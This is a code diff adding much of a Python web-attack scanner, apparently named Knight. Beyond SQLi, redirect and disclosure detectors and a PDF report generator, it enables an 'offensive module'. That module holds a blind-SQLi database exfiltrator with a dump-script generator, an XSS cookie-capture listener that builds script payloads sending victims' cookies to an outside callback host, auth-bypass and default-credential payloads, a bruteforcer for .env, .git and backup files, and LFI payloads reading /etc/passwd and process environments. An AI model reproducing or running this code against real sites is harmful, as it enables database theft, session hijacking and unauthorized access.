+            if err_resp and any(sig in err_resp.text.lower() for sig in ERROR_SIGNATURES):
+                findings.append({
+                    "type": "SQL Injection (error-based)",
+                    "status": "DETECTED",
+                    "parameter": param,
+                    "confidence": "SUSPECTED — error signature seen, verify manually",
+                    "url": error_url,
+                    "proof": "Database error signature appeared after injecting a single quote.",
+                    "repro": f"curl -s '{error_url}'",
+                    "img": None,
+                })
+                log_sqli.info(f"Error-based SQLi candidate: {error_url}")
+
+        # Time-based
+        confirmed = _confirm_time_based_sqli(url, param, original)
+        if confirmed:
+            findings.append(confirmed)
+            log_sqli.info(f"CONFIRMED time-based SQLi: {confirmed['url']}")
+            continue
+
+        # Boolean-based
+        true_url = _inject_sqli(url, param, original + "' OR '1'='1")
+        false_url = _inject_sqli(url, param, original + "' AND '1'='2")
+        baseline_resp = get(url)
+        true_resp = get(true_url)
+        false_resp = get(false_url)
+        if baseline_resp and true_resp and false_resp:
+            base_len = len(baseline_resp.content)
+            true_len = len(true_resp.content)
+            false_len = len(false_resp.content)
+            # Candidate only when TRUE remains close to baseline while FALSE differs materially.
+            close_to_base = abs(true_len - base_len) <= max(32, int(base_len * 0.05))
+            materially_different = abs(false_len - base_len) >= max(64, int(base_len * 0.10))
+            if close_to_base and materially_different:
+                findings.append({
+                    "type": "SQL Injection (boolean-based, blind)",
+                    "status": "DETECTED",
+                    "parameter": param,
+                    "confidence": "SUSPECTED — response-length heuristic only",
+                    "url": true_url,
+                    "proof": f"Baseline/TRUE/FALSE lengths: {base_len}b / {true_len}b / {false_len}b; heuristic indicates a conditional response difference.",
+                    "repro": f"curl -s '{true_url}' vs curl -s '{false_url}'",
+                    "img": None,
+                })
+                log_sqli.info(f"Boolean-blind SQLi candidate: {true_url}")
+    return findings
+
+
+# ==============================================================================
+# SCANNER: INFORMATION DISCLOSURE / DEBUG ENDPOINTS
+# ==============================================================================
+
+log_info_disclosure = get_logger("info_disclosure")
+
+# Conservative markers for obvious debug/config disclosure.  These are
+# deliberately specific so the scanner does not report every text endpoint.
+INFO_DISCLOSURE_SIGNATURES = (
+    "debug mode enabled",
+    "database_url=",
+    "internal_service=",
+    "python implementation details exposed",
+)
+
+def scan_information_disclosure(url: str) -> list[dict]:
+    findings = []
+    resp = get(url)
+    if not resp:
+        return findings
+
+    body = resp.text.lower()
+    matched = [sig for sig in INFO_DISCLOSURE_SIGNATURES if sig in body]
+
+    # Require multiple independent disclosure markers before confirming.
+    if len(matched) >= 2:
+        findings.append({
+            "type": "Information Disclosure",
+            "status": "CONFIRMED",
+            "confidence": "CONFIRMED — debug/configuration information exposed in HTTP response",
+            "url": url,
+            "proof": "Response exposed multiple debug/configuration markers: "
+                     + ", ".join(matched),
+            "repro": f"curl -s '{url}'",
+            "img": None,
+        })
+        log_info_disclosure.info(
+            f"CONFIRMED information disclosure: {url}"
+        )
+
+    return findings
+
+
+# ==============================================================================
+# SCANNER: OPEN REDIRECT (fixed naming)
+# ==============================================================================
+
+log_open_redirect = get_logger("open_redirect")
+
+REDIRECT_PARAM_NAMES = {
+    "redirect", "redirect_uri", "redirecturl", "url", "next", "return",
+    "returnurl", "return_url", "dest", "destination", "continue",
+    "target", "out", "goto", "callback", "callback_url", "redirect_to",
+    "forward", "return_to", "relay", "back"
+}
+
+def scan_open_redirect(url: str) -> list[dict]:
+    findings = []
+    parsed = urlparse(url)
+    qs = parse_qs(parsed.query)
+    EVIL_DOMAINS = [
+        "https://Knight-redirect-test.invalid",
+        "https://attacker.com",
+    ]
+
+    def _is_malicious_redirect(location: str, target: str) -> bool:
+        """Return True if location redirects to the attacker-controlled target."""
+        target_parsed = urlparse(target)
+        loc_parsed = urlparse(location)
+        if target_parsed.scheme not in {"http", "https"} or loc_parsed.scheme not in {"http", "https"}:
+            return False
+        target_host = (target_parsed.hostname or "").rstrip(".").lower()
+        location_host = (loc_parsed.hostname or "").rstrip(".").lower()
+        return (loc_parsed.scheme.lower() == target_parsed.scheme.lower()
+                and location_host == target_host
+                and (loc_parsed.port or (443 if loc_parsed.scheme == "https" else 80)) ==
+                    (target_parsed.port or (443 if target_parsed.scheme == "https" else 80)))
+
+    for param in qs:
+        if param.lower() not in REDIRECT_PARAM_NAMES:
+            continue
+        for evil_url in EVIL_DOMAINS:
+            qs2 = dict(qs)
+            qs2[param] = [evil_url]
+            test_url = urlunparse(parsed._replace(query=urlencode(qs2, doseq=True)))
+            resp = get(test_url)
+            if not resp:
+                continue
+            location = resp.headers.get("location", "")
+            if resp.status_code in (301, 302, 303, 307, 308) and _is_malicious_redirect(location, evil_url):
+                findings.append({
+                    "type": "Open Redirect",
+                    "confidence": "CONFIRMED — redirects to attacker-controlled URL",
+                    "url": test_url,
+                    "proof": f"Server issued {resp.status_code} redirect to {evil_url}",
+                    "repro": f"curl -sI '{test_url}'",
+                    "img": capture_screenshot(test_url),
+                })
+    return findings
+
+
+# ==============================================================================
+# THE SCRIBE (REPORTING)
+# ==============================================================================
+
+log_scribe = get_logger("scribe")
+_CONFIDENCE_COLOR_DEFAULT_CONFIRMED = colors.toColor("#b30000")
+_CONFIDENCE_COLOR_DEFAULT_SUSPECTED = colors.toColor("#b37b00")
+_SEVERITY_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "NONE": 9}
+
+def _confidence_color(conf: str):
+    if conf == "CONFIRMED":
+        return _CONFIDENCE_COLOR_DEFAULT_CONFIRMED
+    if conf.startswith("SUSPECTED"):
+        return _CONFIDENCE_COLOR_DEFAULT_SUSPECTED
+    return colors.black
+
+FINDING_STATUSES = ("DETECTED", "CONFIRMED", "EXPLOITED", "EXTRACTED")
+
+def finding_is_confirmed(f: dict) -> bool:
+    """Single authoritative gate for offensive validation."""
+    return f.get("status") == "CONFIRMED" or (
+        f.get("status") is None and str(f.get("confidence", "")).upper().startswith("CONFIRMED")
+    )
+
+def mask_secret(value: str, keep: int = 4) -> str:
+    value = value or ""
+    if len(value) <= keep:
+        return "*" * len(value)
+    return value[:keep] + "...<redacted>"
+
+def _status_from_finding(f: dict) -> str:
+    explicit = f.get("status")
+    if explicit in FINDING_STATUSES:
+        return explicit
+    conf = str(f.get("confidence", "")).upper()
+    ftype = str(f.get("type", "")).lower()
+    if "EXTRACTED" in conf or "exfiltrat" in conf or "contents extracted" in conf:
+        return "EXTRACTED"
+    if "EXPLOITED" in conf or "payload executed" in conf or "bypass successful" in conf:
+        return "EXPLOITED"
+    if conf.startswith("CONFIRMED") or conf == "CONFIRMED":
+        return "CONFIRMED"
+    return "DETECTED"
+
+def normalize_finding_statuses(findings: list[dict]) -> list[dict]:
+    for f in findings:
+        f["status"] = _status_from_finding(f)
+    return findings
+
+def dedupe_and_triage(findings: list[dict], doctrine: dict) -> list[dict]:
+    findings = normalize_finding_statuses(findings)
+    seen = set()
+    deduped = []
+    for f in findings:
+        key = (f["type"], f["url"])
+        if key in seen:
+            continue
+        seen.add(key)
+        deduped.append(f)
+    def sort_key(f):
+        status_rank = {"EXTRACTED": 0, "EXPLOITED": 1, "CONFIRMED": 2, "DETECTED": 3}.get(f.get("status"), 4)
+        sev = get_vuln_details(f["type"], doctrine).get("sev", "LOW")
+        return (status_rank, _SEVERITY_ORDER.get(sev, 9))
+    deduped.sort(key=sort_key)
+    return deduped
+
+def generate_ai_summary(target: str, findings: list[dict], nuclei_raw: list[str], brain_context: str) -> str:
+    if not findings and not nuclei_raw:
+        return ("No critical vulnerabilities identified in the target infrastructure during this "
+                "automated pass. This does not rule out issues requiring manual/business-logic testing.")
+    prompt = f"""TARGET: {target}
+FINDINGS (already verified/flagged by deterministic checks, not by you): {findings}
+NUCLEI_RAW_OUTPUT: {nuclei_raw}
+CUSTOM_SIGNATURES: {brain_context}
+
+TASK: Write a technical exploit summary for a security audit report. For each
+finding, include a short "Likely Exploitation Path" — a plain-language
+explanation of how an attacker would realistically leverage this specific
+finding.
+
+Rules:
+1. Do NOT invent findings beyond what is listed.
+2. Cross-reference against CUSTOM_SIGNATURES and call out explicit matches.
+3. Preserve each finding's stated confidence tier (CONFIRMED vs SUSPECTED) exactly.
+4. "Likely Exploitation Path" must stay at the conceptual/narrative level.
+5. Technical detail belongs in the existing finding data.
+"""
+    try:
+        resp = ollama.chat(model="llama3", messages=[{"role": "user", "content": prompt}])
+        return resp["message"]["content"]
+    except Exception as e:
+        log_scribe.error(f"LLM summary generation failed: {e}")
+        return (f"[AI summary unavailable — Ollama/llama3 call failed: {e}]\n\n"
+                f"Raw findings are still listed below.")
+
+def generate_report(target: str, ai_proof: str, findings: list[dict], doctrine: dict) -> str:
+    fname = f"Buraq_Audit_{safe_target_name(target)}.pdf"
+    doc = SimpleDocTemplate(fname, pagesize=letter)
+    styles = getSampleStyleSheet()
+    code_style = ParagraphStyle("Code", parent=styles["Normal"], fontName="Courier",
+                                 fontSize=8, textColor=colors.toColor("#444444"), leftIndent=20)
+    story = [
+        Paragraph(f"<b>TECHNICAL EXPLOIT REPORT: {html.escape(target.upper())}</b>", styles["Title"]),
+        Spacer(1, 15),
+        Paragraph(f"<b>Researcher:</b> {html.escape(LEAD_RESEARCHER)} | <b>Build:</b> {VERSION}", styles["Normal"]),
+        Spacer(1, 20),
+        Paragraph("<b>1. TECHNICAL PROOF OF CONCEPT (PoC)</b>", styles["Heading2"]),
+        Paragraph(html.escape(ai_proof).replace("\n", "<br/>"), styles["Normal"]),
+    ]
+    if findings:
+        story.append(Spacer(1, 20))
+        story.append(Paragraph("<b>2. EXECUTIVE SUMMARY</b>", styles["Heading2"]))
+        confirmed_n = sum(1 for f in findings if f.get("status") == "CONFIRMED")
+        summary_data = [["#", "Type", "Status", "Confidence", "Severity"]]
+        for i, f in enumerate(findings, 1):
+            v = get_vuln_details(f["type"], doctrine)
+            summary_data.append([str(i), f["type"], f.get("status", "DETECTED"), f.get("confidence", "?").split(" — ")[0], v["sev"]])
+        sum_table = Table(summary_data, colWidths=[20, 190, 75, 95, 60])
+        sum_table.setStyle(TableStyle([
+            ("BACKGROUND", (0, 0), (-1, 0), colors.HexColor("#333333")),
+            ("TEXTCOLOR", (0, 0), (-1, 0), colors.white),
+            ("GRID", (0, 0), (-1, -1), 0.5, colors.grey),
+            ("FONTSIZE", (0, 0), (-1, -1), 8),
+        ]))
+        story.append(sum_table)
+        story.append(Paragraph(f"<i>{confirmed_n} confirmed, {len(findings) - confirmed_n} suspected "
+                                f"(require manual verification before reporting to a bounty program).</i>",
+                                styles["Normal"]))
+        story.append(PageBreak())
+        story.append(Paragraph("<b>3. VULNERABILITY LOG &amp; REPRODUCTION</b>", styles["Heading2"]))
+        for f in findings:
+            v = get_vuln_details(f["type"], doctrine)
+            conf = f.get("confidence", "UNSPECIFIED")
+            conf_style = ParagraphStyle("Conf", parent=styles["Heading3"],
+                                         textColor=_confidence_color(conf))
+            story.append(Paragraph(f"<b>Finding: {html.escape(f['type'])}</b>", styles["Heading3"]))
+            story.append(Paragraph(f"Status: {html.escape(f.get('status', 'DETECTED'))}", styles["Normal"]))
+            story.append(Paragraph(f"Confidence: {html.escape(conf)}", conf_style))
+            data = [["Severity", v["sev"]], ["CVSS Score", str(v["score"])],
+                    ["Vector", v["vec"]], ["OWASP", v["owasp"]]]
+            t = Table(data, colWidths=[120, 340])
+            t.setStyle(TableStyle([
+                ("BACKGROUND", (0, 0), (0, -1), colors.lightgrey),
+                ("GRID", (0, 0), (-1, -1), 0.5, colors.grey),
+            ]))
+            story.append(t)
+            story.append(Spacer(1, 10))
+            story.append(Paragraph(f"<b>Affected Endpoint:</b> {html.escape(f['url'])}", styles["Normal"]))
+            story.append(Paragraph(f"<b>Evidence:</b> {html.escape(f.get('proof', ''))}", styles["Normal"]))
+            story.append(Paragraph(f"<b>Reproduction:</b> <code>{html.escape(f['repro'])}</code>", code_style))
+            story.append(Spacer(1, 10))
+            story.append(Paragraph("<b>Remediation:</b>", styles["Normal"]))
+            story.append(Paragraph(html.escape(v["fix"]), styles["Normal"]))
+            if f.get("img"):
+                story.append(Spacer(1, 15))
+                story.append(Image(f["img"], width=440, height=240))
+                story.append(Paragraph("<center><i>Fig: Captured evidence of endpoint response</i></center>",
+                                        styles["Italic"]))
+            story.append(PageBreak())
+    else:
+        story.append(Spacer(1, 20))
+        story.append(Paragraph("<b>NO VULNERABILITIES IDENTIFIED DURING THIS AUDIT.</b>", styles["Normal"]))
+    doc.build(story)
+    log_scribe.info(f"Report written: {fname}")
+    return fname
+
+
+# ==============================================================================
+# OFFENSIVE MODULE (fully corrected, now enabled)
+# ==============================================================================
+
+log_off = get_logger("offensive")
+
+# ──────────────────────────────────────────────────────────────────────────────
+# OFF.1 — SQLi Auto-Exfil (with fixed boolean technique)
+# ──────────────────────────────────────────────────────────────────────────────
+
+class SQLiExfiltrator:
+    def __init__(self, url: str, param: str, technique: str = "time", engine: str = "MySQL"):
+        self.url = url
+        self.param = param
+        self.technique = technique
+        self.engine = engine
+
+    def _inject_boolean(self, condition: str) -> bool:
+        """Return True if true‑condition response differs significantly from false‑condition."""
+        parsed = urlparse(self.url)
+        qs = parse_qs(parsed.query)
+        true_sql = f"' OR ({condition})-- -"
+        false_sql = f"' AND NOT ({condition})-- -"
+        qs_true = dict(qs)
+        qs_true[self.param] = [true_sql]
+        qs_false = dict(qs)
+        qs_false[self.param] = [false_sql]
+        url_true = urlunparse(parsed._replace(query=urlencode(qs_true, doseq=True)))
+        url_false = urlunparse(parsed._replace(query=urlencode(qs_false, doseq=True)))
+        resp_true = get(url_true)
+        resp_false = get(url_false)
+        if not resp_true or not resp_false:
+            return False
+        return abs(len(resp_true.content) - len(resp_false.content)) > 20
+
+    def _inject_time(self, condition: str) -> bool:
+        parsed = urlparse(self.url)
+        qs = parse_qs(parsed.query)
+        sleep_sql = {
+            "MySQL":      f"' OR IF(({condition}), SLEEP({SLEEP_SECONDS}), 0)-- -",
+            "PostgreSQL": f"' OR (CASE WHEN ({condition}) THEN pg_sleep({SLEEP_SECONDS}) ELSE 0 END)-- -",
+            "MSSQL":      f"'; IF ({condition}) WAITFOR DELAY '0:0:{SLEEP_SECONDS}'--",
+        }.get(self.engine, f"' OR IF(({condition}), SLEEP({SLEEP_SECONDS}), 0)-- -")
+        qs[self.param] = [sleep_sql]
+        test_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
+        t0 = time.monotonic()
+        resp = get(test_url)
+        elapsed = time.monotonic() - t0
+        return resp is not None and elapsed >= SLEEP_SECONDS * 0.7
+
+    def _inject(self, condition: str) -> bool:
+        if self.technique == "time":
+            return self._inject_time(condition)
+        elif self.technique == "boolean":
+            return self._inject_boolean(condition)
+        return False
+
+    def _get_length(self, query: str, max_len: int = 256) -> int:
+        lo, hi = 0, max_len
+        while lo < hi:
+            mid = (lo + hi) // 2
+            if self._inject(f"LENGTH(({query}))>{mid}"):
+                lo = mid + 1
+            else:
+                hi = mid
+        return lo
+
+    def _get_char(self, query: str, position: int) -> str:
+        lo, hi = 32, 126
+        while lo < hi:
+            mid = (lo + hi) // 2
+            if self._inject(f"ASCII(SUBSTRING(({query}),{position},1))>{mid}"):
+                lo = mid + 1
+            else:
+                hi = mid
+        return chr(lo) if 32 <= lo <= 126 else "?"
+
+    def extract(self, query: str, label: str, max_len: int = 256) -> str:
+        log_off.info(f"SQLi Exfil: extracting {label} via binary search...")
+        length = self._get_length(query, max_len)
+        log_off.info(f"  Length of {label}: {length}")
+        result = ""
+        for pos in range(1, length + 1):
+            c = self._get_char(query, pos)
+            result += c
+            if pos % 10 == 0:
+                log_off.info(f"  [{label}] position {pos}/{length}: {result}")
+        return result
+
+    def run_full_exfil(self) -> dict:
+        results = {}
+        log_off.info("=" * 60)
+        log_off.info("OFFENSIVE SQLi DATA EXFILTRATION")
+        log_off.info("=" * 60)
+        results["version"] = self.extract("@@version", "DB Version")
+        log_off.info(f"[+] DB Version: {results['version']}")
+        results["user"] = self.extract("CURRENT_USER()", "DB User")
+        log_off.info(f"[+] DB User: {results['user']}")
+        results["database"] = self.extract("DATABASE()", "Database Name")
+        log_off.info(f"[+] Database: {results['database']}")
+        tables = []
+        for i in range(1, 11):
+            tbl_query = f"SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT {i-1},1"
+            tbl_name = self.extract(tbl_query, f"Table #{i}", 64)
+            if not tbl_name or tbl_name == "?":
+                break
+            tables.append(tbl_name)
+            log_off.info(f"  Table {i}: {tbl_name}")
+            col_query = (f"SELECT GROUP_CONCAT(column_name SEPARATOR '|') FROM information_schema.columns "
+                         f"WHERE table_name='{tbl_name}' AND table_schema=DATABASE()")
+            columns_raw = self.extract(col_query, f"Columns of {tbl_name}", 512)
+            if columns_raw and columns_raw != "?":
+                cols = columns_raw.split("|")
+                log_off.info(f"    Columns: {', '.join(cols[:8])}")
+                if cols:
+                    sample_query = f"SELECT {cols[0]} FROM {tbl_name} LIMIT 1"
+                    sample = self.extract(sample_query, f"Sample {cols[0]} from {tbl_name}", 128)
+                    if sample and sample != "?":
+                        log_off.info(f"    Sample ({cols[0]}): {sample}")
+        results["tables"] = tables
+        log_off.info("[✔] SQLi exfiltration complete\n")
+        return results
+
+    def generate_dump_script(self, findings: dict) -> str:
+        script = f'''#!/usr/bin/env python3
+# Knight Auto-Generated SQLi Dump Script
+# Target: {self.url}
+# Technique: {self.technique} ({self.engine})
+
+import httpx, time, sys, json, re
+from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+
+TARGET_URL = "{self.url}"
+PARAM = "{self.param}"
+SLEEP_SEC = {SLEEP_SECONDS}
+
+def inject(condition):
+    parsed = urlparse(TARGET_URL)
+    qs = parse_qs(parsed.query)
+    payload = f"' OR IF(({{condition}}), SLEEP({SLEEP_SECONDS}), 0)-- -"
+    qs[PARAM] = [payload]
+    test_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
+    t0 = time.monotonic()
+    try:
+        r = httpx.get(test_url, timeout=10, verify=False)
+        return time.monotonic() - t0 >= SLEEP_SEC * 0.7
+    except:
+        return False
+
+def extract(query, label, max_len=256):
+    lo, hi = 0, max_len
+    while lo < hi:
+        mid = (lo + hi) // 2
+        lo, hi = (mid + 1, hi) if inject(f"LENGTH(({{query}}))>{{mid}}") else (lo, mid)
+    length = lo
+    print(f"  [{{label}}] Length: {{length}}")
+    result = ""
+    for pos in range(1, length + 1):
+        lo, hi = 32, 126
+        while lo < hi:
+            mid = (lo + hi) // 2
+            lo, hi = (mid + 1, hi) if inject(f"ASCII(SUBSTRING(({{query}}),{{pos}},1))>{{mid}}") else (lo, mid)
+        result += chr(lo)
+    return result
+
+if __name__ == "__main__":
+    print("Knight SQLi Dump Script")
+    print("=" * 50)
+    print("Version:", extract("@@version", "DB Version"))
+    print("User:", extract("CURRENT_USER()", "DB User"))
+    print("Database:", extract("DATABASE()", "Database"))
+    for i in range(1, 20):
+        tbl = extract(f"SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT {{i-1}},1", f"Table {{i}}", 64)
+        if not tbl or tbl == "?":
+            break
+        print(f"\\nTable {{i}}: {{tbl}}")
+        cols = extract(f"SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='{{tbl}}'", "Columns", 512)
+        print(f"  Columns: {{cols}}")
+'''
+        return script
+
+
+# ──────────────────────────────────────────────────────────────────────────────
+# OFF.2 — XSS Cookie Capture (thread‑safe, generates attack URLs)
+# ──────────────────────────────────────────────────────────────────────────────
+
+class XSSCookieCapture:
+    def __init__(self, listen_port: int = 8081):
+        self.port = listen_port
+        self.captured = []
+        self._lock = threading.Lock()
+        self._server = None
+        self._thread = None
+        self.callback_url = None
+
+    def _get_external_ip(self) -> str:
+        try:
+            r = httpx.get("https://api.ipify.org?format=text", timeout=5)
+            return r.text.strip()
+        except:
+            return "127.0.0.1"
+
+    class _Handler(http.server.BaseHTTPRequestHandler):
+        capture_ref = None
+
+        def do_GET(self):
+            parsed = urllib.parse.urlparse(self.path)
+            qs = urllib.parse.parse_qs(parsed.query)
+            cookie_data = qs.get("c", [None])[0]
+            location = qs.get("loc", [None])[0]
+            if cookie_data:
+                decoded = urllib.parse.unquote(cookie_data)
+                entry = {
+                    "timestamp": datetime.datetime.now().isoformat(),
+                    "cookie": mask_secret(decoded, keep=4),
+                    "cookie_sha256": hashlib.sha256(decoded.encode("utf-8", "ignore")).hexdigest(),
+                    "source_url": urllib.parse.unquote(location) if location else "unknown",
+                    "remote_ip": self.client_address[0],
+                }
+                if self.capture_ref is not None:
+                    with self.capture_ref._lock:
+                        self.capture_ref.captured.append(entry)
+                log_off.info(f"[XSS CAPTURE] Cookie captured from {entry['source_url']}: {entry['cookie']}")
+            self.send_response(200)
+            self.send_header("Access-Control-Allow-Origin", "*")
+            self.send_header("Content-Type", "image/gif")
+            self.end_headers()
+            self.wfile.write(b"GIF89a\x01\x00\x01\x00\x80\xff\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x00\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;")
+
+        def log_message(self, *args):
+            pass
+
+    def start(self) -> str:
+        port = self.port
+        while port < 65535:
+            try:
+                self._Handler.capture_ref = self
+                self._server = socketserver.TCPServer(("0.0.0.0", port), self._Handler)
+                break
+            except OSError:
+                port += 1
+        if not self._server:
+            log_off.error("XSS Capture: could not find available port")
+            return None
+        self.port = port
+        ResourceManager.register_socket(self._server.socket)
+        ip = self._get_external_ip()
+        self.callback_url = f"http://{ip}:{port}/steal"
+        self._thread = Thread(target=self._server.serve_forever, daemon=True)
+        self._thread.start()
+        log_off.info(f"XSS Capture listener started on {self.callback_url}")
+        return self.callback_url
+
+    def generate_attack_url(self, url: str, param: str) -> str | None:
+        payload = (f'"><script>new Image().src="{self.callback_url}?c="'
+                   f'+encodeURIComponent(document.cookie)+"&loc="'
+                   f'+encodeURIComponent(document.URL)</script>')
+        parsed = urlparse(url)
+        qs = parse_qs(parsed.query)
+        if param in qs:
+            qs[param] = [payload]
+            attack_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
+            return attack_url
+        return None
+
+    def stop(self):
+        if self._server:
+            self._server.shutdown()
+            self._server.socket.close()
+            if self._server.socket in ResourceManager._sockets:
+                ResourceManager._sockets.remove(self._server.socket)
+            log_off.info("XSS Capture listener stopped")
+
+    def get_captured(self) -> list:
+        with self._lock:
+            return self.captured[:]
+
+
+# ──────────────────────────────────────────────────────────────────────────────
+# OFF.3 — Auth Bypass (fixed boolean crash)
+# ──────────────────────────────────────────────────────────────────────────────
+
+AUTH_BYPASS_PAYLOADS = [
+    ("SQLi OR 1=1",         {"username": "' OR '1'='1", "password": "' OR '1'='1"}),
+    ("SQLi comment",        {"username": "admin'-- -",  "password": "anything"}),
+    ("SQLi union select",   {"username": "' UNION SELECT 1,'admin','hash'-- -", "password": "x"}),
+    ("Default admin:admin",  {"username": "admin", "password": "admin"}),
+    ("Default admin:password", {"username": "admin", "password": "password"}),
+    ("Default admin:1234",   {"username": "admin", "password": "1234"}),
+    ("Default root:root",    {"username": "root", "password": "root"}),
+    ("Default root:toor",    {"username": "root", "password": "toor"}),
+    ("Default test:test",    {"username": "test", "password": "test"}),
+    ("Default guest:guest",  {"username": "guest", "password": "guest"}),
+    ("Default admin:",       {"username": "admin", "password": ""}),
+    ("Default tomcat:tomcat",{"username": "tomcat", "password": "tomcat"}),
+    ("Header X-Forwarded-For", {"_header": "X-Forwarded-For: 127.0.0.1"}),
+    ("Header X-Real-IP",      {"_header": "X-Real-IP: 127.0.0.1"}),
+    ("Header X-Original-URL", {"_header": "X-Original-URL: /admin"}),
+]
+
+COMMON_ADMIN_PATHS = [
+    "/admin", "/administrator", "/login", "/wp-login.php", "/admin/login.php",
+    "/user/login", "/auth", "/signin", "/cpanel", "/manager",
+    "/dashboard", "/portal", "/api/auth", "/api/v1/auth",
+    "/api/v1/login", "/admin/login.html", "/login.html",
+]
+
+def discover_auth_endpoints(base_urls: list[str]) -> list[tuple]:
+    auth_endpoints = []
+    def probe(path):
+        for base in base_urls:
+            url = base.rstrip("/") + path
+            try:
+                r = httpx.get(url, timeout=HTTP_TIMEOUT, verify=False, follow_redirects=False)
+                if r.status_code in (200, 301, 302, 401, 403):
+                    text = r.text.lower() if hasattr(r, 'text') else ""
+                    if any(ind in text for ind in ["password","login","sign in","username","authenticate"]) or r.status_code in (401, 403):
+                        return url, r.status_code
+            except:
+                pass
+        return None
+    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_THREADS) as ex:
+        for fut in concurrent.futures.as_completed([ex.submit(probe, p) for p in COMMON_ADMIN_PATHS]):
+            res = fut.result()
+            if res:
+                auth_endpoints.append(res)
+                log_off.info(f"Auth endpoint found: {res[0]} [{res[1]}]")
+    return auth_endpoints
+
+def test_auth_bypass(auth_endpoints: list[tuple]) -> list[dict]:
+    findings = []
+    for url, _ in auth_endpoints:
+        baseline_resp = get(url)
+        if not baseline_resp:
+            continue
+        auth_indicators = ["logout", "dashboard", "welcome", "profile", "account", "my", "settings", "admin"]
+        for label, payload in AUTH_BYPASS_PAYLOADS:
+            try:
+                if "_header" in payload:
+                    hdr_key, hdr_val = payload["_header"].split(": ", 1)
+                    r = httpx.get(url, headers={hdr_key: hdr_val}, timeout=HTTP_TIMEOUT,
+                                  verify=False, follow_redirects=False)
+                else:
+                    r = httpx.post(url, data=payload, timeout=HTTP_TIMEOUT,
+                                   verify=False, follow_redirects=False)
+                if not r:
+                    continue
+                if r.text == baseline_resp.text and r.status_code == baseline_resp.status_code:
+                    continue
+                # FIX: correct boolean check (no any() on a bool)
+                has_session = "Set-Cookie" in r.headers and "session" in r.headers.get("Set-Cookie", "").lower()
+                has_auth_content = any(ind in r.text.lower() for ind in auth_indicators)
+                if r.status_code in (200, 302, 303) and (has_session or has_auth_content):
+                    findings.append({
+                        "type": "Auth Bypass",
+                        "confidence": f"SUSPECTED — {label}",
+                        "url": url,
+                        "proof": f"Payload '{label}' returned HTTP {r.status_code}, differs from baseline, has auth indicators.",
+                        "repro": f"curl -X POST '{url}' -d 'username=admin&password=admin'",
+                        "img": None,
+                    })
+                    log_off.info(f"[!] Auth bypass candidate: {url} via {label}")
+                    break
+            except:
+                pass
+    return findings
+
+
+# ──────────────────────────────────────────────────────────────────────────────
+# OFF.4 — Directory Bruteforce
+# ──────────────────────────────────────────────────────────────────────────────
+
+COMMON_DIRS = [
+    ".git/", ".git/config", ".git/HEAD", ".svn/", ".env", ".env.production",
+    ".env.local", "config.php", "config.json", "configuration.php",
+    "settings.php", "db.php", "database.php", "credentials.yml",
+    "backup", "backups", "backup.sql", "db.sql", "dump.sql",
+    "backup.tar.gz", "backup.zip", "www.zip", "www.tar.gz",
+    "admin", "administrator", "admin.php", "cpanel", "dashboard",
+    "api", "api/", "api/v1", "api/v2", "graphql", "swagger",
+    "openapi.json", "swagger.json",
+    "phpmyadmin", "phpPgAdmin", "adminer.php", "pma",
+    "phpinfo.php", "info.php", "status.php", "test.php",
+    "jenkins", "jira", "confluence", "gitlab", "kibana", "grafana",
+    "uploads", "upload", "files", "download", "downloads",
+    "robots.txt", "sitemap.xml", "crossdomain.xml",
+    "favicon.ico", "index.html", "index.php",
+    "wp-admin", "wp-content", "wp-includes", "wp-config.php",
+    "manager", "management", "controlpanel", "portal",
+]
+
+def dir_bruteforce(base_urls: list[str], turbo: bool = False) -> list[dict]:
+    findings = []
+    dirs = [d for d in COMMON_DIRS if not turbo or any(d.startswith(p) for p in [".git", ".env", "admin", "backup", "api", "config", "wp-", "php"])]
+    tasks = [(b, d) for b in base_urls for d in dirs]
+    random.shuffle(tasks)
+
+    def probe(base_url, path):
+        url = f"{base_url.rstrip('/')}/{path}"
+        try:
+            r = httpx.get(url, timeout=HTTP_TIMEOUT, verify=False, follow_redirects=False)
+            if r.status_code in (200, 201, 204, 301, 302, 303, 307, 401, 403):
+                return url, r.status_code, len(r.content) if hasattr(r, 'content') else 0
+        except:
+            pass
+        return None
+
+    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_THREADS) as ex:
+        for fut in concurrent.futures.as_completed([ex.submit(probe, b, d) for b, d in tasks]):
+            res = fut.result()
+            if res:
+                url, status, size = res
+                findings.append({
+                    "type": f"Endpoint Found — HTTP {status}",
+                    "confidence": "SUSPECTED — manual review recommended",
+                    "url": url,
+                    "proof": f"Discovered {url} — HTTP {status}, {size}b",
+                    "repro": f"curl -sI '{url}'",
+                    "img": None,
+                })
+                log_off.info(f"Discovered: {url} [{status}] ({size}b)")
+    return findings
+
+
+# ──────────────────────────────────────────────────────────────────────────────
+# OFF.5 — LFI/RFI Scanner
+# ──────────────────────────────────────────────────────────────────────────────
+
+LFI_PAYLOADS = [
+    ("/etc/passwd",                 "../../../../etc/passwd"),
+    ("/etc/passwd deep",            "../../../../../../etc/passwd"),
+    ("/etc/hosts",                  "../../../../etc/hosts"),
+    ("windows/win.ini",             "../../../../windows/win.ini"),
+    ("proc/self/environ",           "../../../../proc/self/environ"),
+    ("php://filter b64 index",      "php://filter/convert.base64-encode/resource=index.php"),
+    ("php://filter b64 passwd",     "php://filter/convert.base64-encode/resource=/etc/passwd"),
+    ("data:// text/plain",          "data://text/plain;base64,PD9waHAgZWNobyAiTEZJIERFVEVDVEVEWyI7ID8+"),
+    ("double-encoding passwd",      "..%252f..%252f..%252fetc/passwd"),
+    ("null byte passwd",            "../../../../etc/passwd%00"),
+]
+
+LFI_SUCCESS_MARKERS = ["root:", "bin:", "daemon:", "nobody:", "www-data:",
+                       "[extensions]", "<?php", "PD9waHA", "HTTP_USER_AGENT"]
+
+def scan_lfi_rfi(param_urls: list[str]) -> list[dict]:
+    findings = []
+    for url in param_urls[:100]:
+        parsed = urlparse(url)
+        qs = parse_qs(parsed.query)
